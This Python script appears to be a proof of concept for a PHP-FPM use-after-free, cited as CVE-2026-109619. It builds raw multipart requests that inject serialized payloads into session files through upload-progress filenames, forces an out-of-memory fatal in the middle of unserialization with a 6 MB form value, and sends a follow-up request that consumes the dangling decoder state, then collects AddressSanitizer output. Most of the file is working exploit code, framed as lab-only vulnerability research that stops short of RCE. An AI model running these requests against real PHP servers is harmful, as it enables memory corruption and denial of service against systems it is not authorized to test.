#!/usr/bin/env python3
"""
CVE-2026-109619 (GHSA-6wmf-4rv5-p3rp) — FPM chain reproduction with ASAN
evidence: stale unserialize bookkeeping consumed by session upload-progress
BEFORE Basic's RINIT.

Public writeup (calif.io/php2shell, "But what about PHP-FPM?"):
  "The unserializer keeps shared bookkeeping for serialized references and
   values awaiting destruction. php_var_unserialize_init() allocates this
   state from the request heap and publishes it in the Basic extension's
   globals. ... A fatal inside the live decoder can skip that operation.
   ... Request shutdown releases the heap while BG(unserialize).data still
   points into it and the nesting level remains nonzero. Because this fatal
   happened after successful request startup, PHP-FPM can keep the worker
   alive.
   The next multipart request reaches Session upload progress before
   Basic's normal request initialization. The stale nesting level makes
   php_var_unserialize_init() treat the dangling pointer as an active
   nested decoder."

Chain reproduced here against the ASAN FPM lab (lab-asan-fpm, :18084):

  A1. Build TWO sessions via upload-progress filename injection
      (Chain-C mechanism, PHP Bug #71101 lineage), both under the
      php_serialize dir:
      - Session P (producer): a 6 MB upload-progress form value grows the
        session key — the OOM producer's chosen crossing allocation —
        plus a pipe-carrying filename.
      - Session C (consumer): a small session whose content carries
        "x|R:1;" (the writeup's serialized-reference primitive).

  A2. Producer (the writeup's OOM producer): GET the `php`-handler dir
      (api/producer.php) with the session-P cookie. The script pins
      memory pressure just below memory_limit; session_start()
      mismatch-decodes session P and the attacker-grown session KEY
      allocation (zend_string_init of everything before the first pipe)
      crosses memory_limit INSIDE the decoder, after
      php_var_unserialize_init() published the bookkeeping. The longjmp
      unwinds past PHP_VAR_UNSERIALIZE_DESTROY(): BG(unserialize).data
      keeps pointing into the request heap, level != 0, serialize_lock
      untouched. Normal request shutdown frees the heap (tracked
      allocator: real free()); the FPM worker survives. Session P is
      destroyed by the failed decode — irrelevant from here on.

  B.  Consumer — MUST be the very next request on the worker (any
      intermediate request's RINIT would memset BG(unserialize)):
      multipart upload to the php_serialize dir with session C's SID +
      PHP_SESSION_UPLOAD_PROGRESS + a file part. rfc1867 FILE_START runs
      BEFORE Basic's RINIT (php_hash_environment at main.c:1820 precedes
      zend_activate_modules at :1821), so the stale nesting level is
      still nonzero: php_session_initialize() decodes session C,
      php_var_unserialize_init() returns the DANGLING bookkeeping, and
      php_var_unserialize()'s wrapper immediately dereferences it
      ((*var_hash)->last) — plus the R: payload walks the entries list
      via var_access(). Expected: AddressSanitizer heap-use-after-free.

The lab (one static FPM child) guarantees A2 and B land on the same
worker — the cross-request requirement.

Instrumentation note: this lab's PHP is built with the upstream debug
prints in php_var_unserialize_init()/destroy() enabled ("[UAFDBG]
INIT/DESTROY lock=.. level=.." in the worker stderr / docker logs) —
the producer's INIT-without-DESTROY and the consumer's stale-branch
INIT (pre-INIT level=1) are directly observable.

Escalation to weaponized RCE (heap groom, reclaimed lists, negative
used_slots) is out of scope; this script captures the stale-state
consumption evidence only.

Usage:
  python3 verify_109619_fpm_chain.py --target http://127.0.0.1:18084
  # raw evidence afterwards:
  docker logs php2shell-asan-fpm 2>&1 | grep -A25 AddressSanitizer | head -60

For authorized security testing against your own lab only.
"""
import argparse
import re
import socket
import subprocess
import sys
import time
from urllib.parse import urlparse

BOUNDARY = "UAFCHAIN"
SID = "abcdef0123456789abcdef0123456789"


def http_req(host, port, raw, timeout=60):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(raw)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def upload_inject(host, port, path, sid, filename, progress="x"):
    """Multipart with SID + upload-progress + file part carrying the
    injected filename (rfc1867 backslash-escaping lands the payload
    verbatim in the session file). The upload-progress FORM VALUE
    becomes part of the session key (`upload_progress_<value>`) —
    unlike the filename it is not capped by the ~5 KB multipart header
    limit, so a large value grows the php-handler decoder's KEY
    allocation (zend_string_init) — the OOM producer's chosen
    crossing allocation."""
    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{progress}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\nZ\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode("latin-1")
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return http_req(host, port, req)


def get_with_cookie(host, port, path, sid, timeout=60):
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    return http_req(host, port, req, timeout=timeout)


def docker_exec(container, cmd):
    try:
        r = subprocess.run(["docker", "exec", container] + cmd,
                            capture_output=True, text=True, timeout=20)
        return (r.stdout + r.stderr).strip()
    except Exception as e:
        return f"<docker exec failed: {e}>"


def docker_logs_since(container, seconds):
    try:
        r = subprocess.run(["docker", "logs", "--since", f"{seconds}s", container],
                            capture_output=True, text=True, timeout=20)
        return r.stdout + r.stderr
    except Exception as e:
        return f"<docker logs failed: {e}>"


def grep_asan(blob):
    hits = []
    grab = False
    for line in blob.splitlines():
        if "ERROR: AddressSanitizer" in line:
            grab = True
            hits.append([])
        if grab:
            hits[-1].append(line)
            if len(hits[-1]) > 30:
                grab = False
    return hits


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18084")
    ap.add_argument("--sid", default=SID)
    ap.add_argument("--container", default="php2shell-asan-fpm")
    ap.add_argument("--build-path", default="/app/upload.php",
                    help="php_serialize dir endpoint")
    ap.add_argument("--producer-path", default="/api/producer.php",
                    help="php handler dir endpoint defining BusyLoop")
    ap.add_argument("--consumer-path", default="/api/endpoint.php",
                    help="php handler dir endpoint for the consumer request")
    args = ap.parse_args()

    u = urlparse(args.target)
    host, port = u.hostname, u.port or 80

    print("[*] CVE-2026-109619 FPM chain: stale BG(unserialize) consumed by")
    print("    session upload-progress before Basic's RINIT")
    print(f"[*] Target: {args.target}  (single static FPM child — the")
    print("    producer and consumer requests share one worker)")
    print()

    # --- A1: build the producer and consumer sessions -------------------
    # The upload-progress FORM VALUE becomes the session key suffix
    # (`upload_progress_<value>`); unlike the filename (capped at ~5 KB
    # by multipart header reading), a normal form field can be large.
    # Session P's 6 MB key is the OOM producer's chosen crossing
    # allocation (zend_string_init of everything before the first pipe,
    # executed AFTER php_var_unserialize_init() published the decoder
    # state); session C carries the R:-reference payload for the
    # consumer decode.
    sid_p = args.sid
    sid_c = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
    print("[A1] Building two sessions (php_serialize dir):")
    print(f"     session P ({sid_p}): 6 MB upload-progress value grows the")
    print(f"        session key (the OOM crossing allocation); pipe filename")
    print(f"     session C ({sid_c}): 'x|R:1;' filename payload (the writeup's")
    print(f"        serialized-reference primitive)")
    upload_inject(host, port, args.build_path, sid_p, "x|i:1;",
                 progress="A" * (6 * 1024 * 1024))
    upload_inject(host, port, args.build_path, sid_c, 'x|R:1;',
                  progress="c")
    for tag, s in (("P", sid_p), ("C", sid_c)):
        sess = docker_exec(args.container, ["cat", f"/tmp/sessions/sess_{s}"])
        print(f"     session {tag}: {sess[:100]}...")
    print()

    # --- A2: producer — OOM mid-decode ---------------------------------
    print("[A2] Producer: GET %s with session-P cookie" % args.producer_path)
    print("     (memory pressure pinned below memory_limit; session_start()")
    print("      mismatch-decodes; the 6 MB session KEY allocation")
    print("      (zend_string_init) crosses memory_limit INSIDE the decoder ->")
    print("      PHP_VAR_UNSERIALIZE_DESTROY skipped, BG(unserialize).data")
    print("      dangling, level != 0, serialize_lock untouched)")
    t0 = time.time()
    resp = get_with_cookie(host, port, args.producer_path, sid_p,
                           timeout=90)
    dt = time.time() - t0
    text = resp.decode("latin1", "replace") if resp else ""
    fatal = [l for l in text.splitlines()
             if "Allowed memory size" in l or "Maximum execution time" in l]
    print(f"     response: {text.split(chr(13), 1)[0][:60] if text else '<none>'}"
          f"   ({dt:.1f}s)")
    for line in fatal[:2]:
        print(f"     [EVIDENCE] {line.strip()[:160]}")
    if not fatal:
        # FPM may deliver the fatal on stderr only; check the worker log
        log = docker_logs_since(args.container, 30)
        line = next((l for l in log.splitlines()
                     if "Allowed memory size" in l), None)
        if line:
            print(f"     [EVIDENCE] (worker stderr) {line.strip()[:160]}")
        else:
            print("     [!] no OOM fatal observed — check memory_limit in")
            print("        the pool and the pad size in producer.php")
    print("     [instrumentation] this worker's [UAFDBG] sequence should now")
    print("     show an INIT WITHOUT a matching DESTROY (destroy skipped by")
    print("     the bailout) — check docker logs after this run.")

    # --- B: consumer — MUST be the very next request on this worker ------
    # (Any intermediate request's Basic RINIT would memset BG(unserialize)
    # and erase the stale state — including the survival check, which is
    # therefore deferred until after B.)
    print()
    print("[B] Consumer (immediately after the producer): multipart upload")
    print("    with session-C's SID + PHP_SESSION_UPLOAD_PROGRESS + a file")
    print("    part, php_serialize dir. FILE_START reaches")
    print("    php_session_initialize() during POST parsing — BEFORE")
    print("    Basic's RINIT (php_hash_environment at main.c:1820 precedes")
    print("    zend_activate_modules at :1821) — so the stale nesting level")
    print("    makes php_var_unserialize_init() reuse the dangling decoder")
    print("    state; php_var_unserialize()'s wrapper dereferences it at")
    print("    once ((*var_hash)->last), and the R: payload walks the stale")
    print("    entries list via var_access().")
    resp = upload_inject(host, port, args.build_path, sid_c, "consumer.bin",
                         progress="c")
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") \
        if resp else "<no response>"
    print(f"     {status}")

    # post-check: worker survival (deferred to AFTER the consumer — the
    # single child must survive the chain; ASAN halt_on_error=0 keeps it
    # serving)
    resp_alive = http_req(host, port, (
        f"GET /nosession.php HTTP/1.1\r\nHost: {host}\r\n"
        f"Connection: close\r\n\r\n").encode())
    print(f"     worker still alive after the chain: "
          f"{'yes' if b'no session_start' in resp_alive else 'NO'}")
    print()

    # --- evidence --------------------------------------------------------
    print("[*] ASAN evidence from the FPM worker (docker logs):")
    blob = docker_logs_since(args.container, 120)
    reports = grep_asan(blob)
    if not reports:
        print("     <no AddressSanitizer report in the last 2 minutes>")
        print("     raw check: docker logs %s 2>&1 | grep -B2 -A25 AddressSanitizer"
              % args.container)
        print("     If the producer fatal did not fire (A2), the chain is not")
        print("     armed — re-run and check max_execution_time in the pool.")
    else:
        print(f"     {len(reports)} AddressSanitizer report(s) captured;"
              f" first report:")
        for line in reports[0][:28]:
            print(f"       {line[:150]}")
        print()
        blob_l = blob.lower()
        markers = {
            "freed-by var_destroy/tracked free": "freed by thread" in blob_l,
            "php_var_unserialize in stack": "php_var_unserialize" in blob_l,
            "session decode in stack": ("php_session" in blob_l
                                        or "rfc1867" in blob_l),
        }
        for k, v in markers.items():
            print(f"     [{'x' if v else ' '}] {k}")
    print()
    print("[*] Chain mapping (writeup -> this lab):")
    print("    A2 producer  = application-level session decode + memory")
    print("                  pressure crossing the limit mid-decode")
    print("                  (phpMyAdmin/WordPress-style reachable decode;")
    print("                  the writeup's 'controlled memory pressure... a")
    print("                  later allocation hits memory_limit' producer)")
    print("    B  consumer = multipart upload-progress path entering session")
    print("                  decode BEFORE Basic RINIT (zend_activate_modules")
    print("                  runs after php_hash_environment)")
    print("    The ASAN report above is the writeup's 'stale nesting level")
    print("    makes php_var_unserialize_init() treat the dangling pointer")
    print("    as an active nested decoder' made visible.")
    print("[*] Honest ceiling: stale-state CONSUMPTION reproduced with ASAN")
    print("    evidence. Weaponization (heap grooming, reclaimed reference")
    print("    lists, negative used_slots slot placement -> RCE) is out of")
    print("    scope for this repo, consistent with the public record.")


if __name__ == "__main__":
    main()
